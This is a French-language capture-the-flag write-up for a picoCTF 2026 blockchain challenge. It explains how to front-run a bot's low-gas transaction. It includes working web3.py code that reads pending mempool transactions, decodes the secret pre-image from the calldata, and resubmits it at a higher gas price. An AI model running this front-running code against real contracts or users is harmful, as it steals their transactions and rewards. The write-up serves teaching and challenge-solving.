# 744 — Front_Running

**Événement** : picoCTF 2026 · **Catégorie** : Blockchain

## Énoncé

> A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash. A Victim Bot has found the answer and is trying to submit it, but they are being very stingy with their gas price.

Le contrat `FrontRunning.sol` est fourni, ainsi qu'un accès RPC à l'instance.

## Analyse

Le contrat expose deux fonctions qui nous intéressent :

- `unlock(string)` — vérifie que l'argument est bien le pré-image du hash stocké, puis marque le coffre comme déverrouillé ;
- `getFlag()` — ne rend le flag qu'à l'appelant qui a déverrouillé en premier.

Le bot victime, lui, a déjà trouvé le pré-image et le soumet régulièrement. Le détail qui fait tout basculer est dans l'énoncé : il paie un **gas price très bas**. Sa transaction reste donc un moment dans la mempool publique avant d'être incluse dans un bloc.

Or une transaction dans la mempool n'est pas chiffrée : sa calldata est lisible par n'importe quel nœud qui écoute les transactions en attente. L'argument `string` de `unlock` y figure en clair, encodé en ABI. Il suffit de le décoder.

Reste à passer devant. Les validateurs et les constructeurs de blocs trient les transactions en attente par rentabilité, c'est-à-dire par gas price décroissant. En soumettant un appel identique avec un gas price strictement supérieur, notre transaction est ordonnée avant celle du bot : elle consomme le déverrouillage, et l'appel de la victime arrive trop tard.

## Solution

### 1. Calculer le sélecteur et surveiller la mempool

```python
from web3 import Web3
from eth_utils import keccak
from eth_abi import decode as abi_decode

w3 = Web3(Web3.HTTPProvider("http://<HOST>:<PORT>"))
CONTRACT = Web3.to_checksum_address("0x<CONTRAT>")

sel = keccak(b"unlock(string)")[:4].hex()
print("sélecteur:", sel)      # a96ce7aa

f = w3.eth.filter("pending")
for h in f.get_new_entries():
    tx = w3.eth.get_transaction(h)
    if not tx.to or tx.to.lower() != CONTRACT.lower():
        continue
    data = tx["input"].hex()
    if not data.startswith(sel):
        continue
    # data[:8]  -> sélecteur (hex()[2:] commence après "0x")
    args = abi_decode(["string"], bytes.fromhex(data[10:]))
    print("pré-image volée :", args[0])
    print("gas price victime:", tx["gasPrice"])
```

Le décalage `10` mérite d'être explicite : `hex()` renvoie `0x` suivi de 8 caractères de sélecteur, soit 10 caractères à sauter avant les données ABI.

### 2. Rejouer le pré-image devant la victime

Le nœud de l'instance n'a pas de compte déverrouillé : `transact()` échouerait. On signe donc localement.

```python
import time

acct = w3.eth.account.from_key("<PRIVATE_KEY>")
secret = "<pré-image lue dans la mempool>"
```

On construit la calldata proprement avec le contrat compilé :

```python
abi = [{"name": "unlock", "type": "function", "stateMutability": "nonpayable",
        "inputs": [{"name": "s", "type": "string"}], "outputs": []}]
c = w3.eth.contract(address=CONTRACT, abi=abi)

victim_gas = w3.eth.gas_price          # ou le gasPrice relevé à l'étape 1
tx = c.functions.unlock(secret).build_transaction({
    "from": acct.address,
    "nonce": w3.eth.get_transaction_count(acct.address),
    "gas": 200000,
    "gasPrice": victim_gas * 2,
    "chainId": w3.eth.chain_id,
})
signed = acct.sign_transaction(tx)
h = w3.eth.send_raw_transaction(signed.raw_transaction)
print("tx:", h.hex())
w3.eth.wait_for_transaction_receipt(h)
```

### 3. Lire le flag

Une fois notre transaction minée avant celle du bot, le coffre est déverrouillé pour notre adresse :

```bash
cast call <CONTRACT> 'getFlag()(string)' --rpc-url http://<HOST>:<PORT>
```

### Pourquoi ça marche

La mempool est un espace public : toute transaction non encore minée est lisible, calldata comprise. Le seul verrou restant est l'**ordre d'inclusion**, et cet ordre dépend du prix offert par unité de gas. À appel identique, une transaction mieux payée passe devant. Le contrat, lui, ne distingue pas les appelants : il récompense le premier déverrouillage, quel qu'il soit. On ne casse donc ni le hash ni la cryptographie : on exploite la transparence et la logique d'ordonnancement de la chaîne.

## Pièges

- **Le filtre `pending` qui ne rend rien.** Certains nœuds ne diffusent pas les transactions en attente (`--txpool` désactivé) ou renvoient des hachés expirés ; il faut boucler et ignorer les `TransactionNotFound`.
- **Le décalage de la calldata.** `data[10:]` en hexadécimal (et non `data[4:]` en octets) : une erreur d'un caractère décale tout le décodage ABI et lève une exception.
- **Le remplacement de transaction.** Réutiliser le même nonce avec un gas price insuffisamment supérieur déclenche `replacement transaction underpriced`. On garde un nonce neuf, ou on augmente franchement le prix.
- **`transact()` sur un nœud sans compte.** L'erreur `unlock account` est explicite : il faut passer par `sign_transaction` puis `send_raw_transaction`.
- **Le doublon de pré-image.** La valeur volée dans la mempool est celle du coffre, pas le flag : `getFlag()` renvoie autre chose que l'argument observé dans la transaction du bot.
